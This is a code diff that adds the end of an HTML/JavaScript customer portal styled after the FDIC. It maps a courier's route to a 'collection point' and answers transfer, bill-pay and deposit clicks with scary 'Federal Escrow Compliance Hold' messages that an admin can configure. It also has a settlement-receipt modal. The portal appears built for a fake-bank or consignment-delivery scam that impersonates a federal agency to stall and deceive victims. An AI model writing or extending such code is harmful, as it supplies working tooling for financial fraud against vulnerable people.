+      // 2. CONFIRMED COLLECTION POINT (Pushpin)
+      const destLabel = currentCustomer.destination_label || "Confirmed Collection Point";
+      const destHtml = `
+        <div class="collection-point-pin-wrapper">
+          <i class="fa-solid fa-location-dot text-white text-lg"></i>
+        </div>
+      `;
+      const destIcon = L.divIcon({
+        className: 'custom-dest-div',
+        html: destHtml,
+        iconSize: [44, 44],
+        iconAnchor: [22, 22]
+      });
+
+      if (customerDestinationMarker) {
+        customerDestinationMarker.setLatLng([destLat, destLon]);
+      } else {
+        customerDestinationMarker = L.marker([destLat, destLon], { icon: destIcon }).addTo(customerMapInstance);
+      }
+      customerDestinationMarker.bindPopup(`<b>${destLabel}</b><br>${currentCustomer.destination_address || 'Address'}`);
+
+      // Fit bounds for clean visibility (No polyline route line)
+      const bounds = L.latLngBounds([[driverLat, driverLon], [destLat, destLon]]);
+      customerMapInstance.fitBounds(bounds, { padding: [50, 50], maxZoom: 15 });
+    }
+
+    /* ACTION HANDLERS WITH ADMIN CONFIGURABLE COMPLIANCE ERRORS */
+    function handleTransferClick() {
+      const msg = currentCustomer.transfer_error_msg || "Transfer Restricted: Federal Escrow Compliance Hold. Funds are undergoing final consignment escort verification with your designated courier.";
+      showComplianceModal("Transfer Restricted", msg);
+    }
+
+    function handleBillPayClick() {
+      const msg = currentCustomer.billpay_error_msg || "Bill Pay Suspended: Account is currently in Transit Escrow Status. Third-party disbursements are locked until courier delivery is confirmed.";
+      showComplianceModal("Bill Pay Suspended", msg);
+    }
+
+    function handleDepositClick() {
+      const msg = currentCustomer.deposit_error_msg || "Deposit Verification Locked: Inbound ACH and mobile check capture are temporarily paused pending physical handover authorization.";
+      showComplianceModal("Deposit Capture Locked", msg);
+    }
+
+    function showComplianceModal(title, message) {
+      document.getElementById('complianceModalTitle').innerText = title;
+      document.getElementById('complianceModalMessage').innerText = message;
+      document.getElementById('complianceModal').classList.remove('hidden');
+      document.getElementById('complianceModal').classList.add('flex');
+    }
+
+    function closeComplianceModal() {
+      document.getElementById('complianceModal').classList.add('hidden');
+      document.getElementById('complianceModal').classList.remove('flex');
+    }
+
+    function openSettlementReceiptModal() {
+      document.getElementById('receiptModal').classList.remove('hidden');
+      document.getElementById('receiptModal').classList.add('flex');
+    }
+
+    function closeSettlementReceiptModal() {
+      document.getElementById('receiptModal').classList.add('hidden');
+      document.getElementById('receiptModal').classList.remove('flex');
+    }
+
+    function switchCustomerTab(tabName) {
+      ['home', 'ledger', 'profile'].forEach(t => {
+        const content = document.getElementById(`tabContent-${t}`);
+        const btn = document.getElementById(`tabBtn-${t}`);
+        if (t === tabName) {
+          content.classList.remove('hidden');
+          btn.className = "py-1.5 px-4 rounded-lg text-xs font-bold text-white bg-fdic-navy border border-blue-700 transition flex items-center space-x-1.5";
+        } else {
+          content.classList.add('hidden');
+          btn.className = "py-1.5 px-4 rounded-lg text-xs font-semibold text-blue-200 hover:text-white hover:bg-blue-900/50 transition flex items-center space-x-1.5";
+        }
+      });
+
+      if (tabName === 'home' && customerMapInstance) {
+        setTimeout(() => {
+          customerMapInstance.invalidateSize();
+          updateCustomerMapPins();
+        }, 150);
+      }
+    }
+
+    function handleLogout() {
+      localStorage.removeItem('fdic_active_customer');
+      window.location.href = "index.html";
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      initCustomerPortal();
+    });
+  </script>
+</body>
+</html>
